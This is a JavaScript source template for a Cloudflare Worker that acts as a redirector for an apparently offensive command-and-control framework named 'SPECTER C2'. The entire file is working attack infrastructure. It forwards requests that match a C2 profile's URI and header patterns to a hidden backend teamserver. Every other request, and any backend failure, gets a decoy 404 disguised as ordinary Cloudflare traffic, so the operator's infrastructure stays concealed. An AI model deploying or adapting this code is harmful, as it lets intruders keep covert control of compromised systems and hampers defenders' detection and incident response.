/**
 * SPECTER C2 CloudFlare Worker — Traffic Filter
 *
 * Inspects incoming requests against the C2 profile. Matching requests are
 * forwarded to the backend teamserver. Non-matching requests receive a
 * decoy response to blend into normal web traffic.
 *
 * Profile ID: ${profile_id}
 */

const BACKEND_URL = "${backend_url}";
const URI_REGEX   = new RegExp("${uri_pattern}");
const HDR_NAME    = "${header_name}";
const HDR_REGEX   = new RegExp("${header_pattern}");
const DECOY_BODY  = `${decoy_response}`;

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Check URI pattern
  if (!URI_REGEX.test(url.pathname)) {
    return decoyResponse();
  }

  // Check required header
  const hdrValue = request.headers.get(HDR_NAME);
  if (!hdrValue || !HDR_REGEX.test(hdrValue)) {
    return decoyResponse();
  }

  // Forward to backend
  const backendUrl = BACKEND_URL + url.pathname + url.search;
  const backendRequest = new Request(backendUrl, {
    method:  request.method,
    headers: request.headers,
    body:    request.body,
  });

  try {
    return await fetch(backendRequest);
  } catch (err) {
    // On backend failure, return decoy to avoid exposing infrastructure
    return decoyResponse();
  }
}

function decoyResponse() {
  return new Response(DECOY_BODY, {
    status: 404,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Server":       "cloudflare",
      "Cache-Control": "no-store",
    },
  });
}
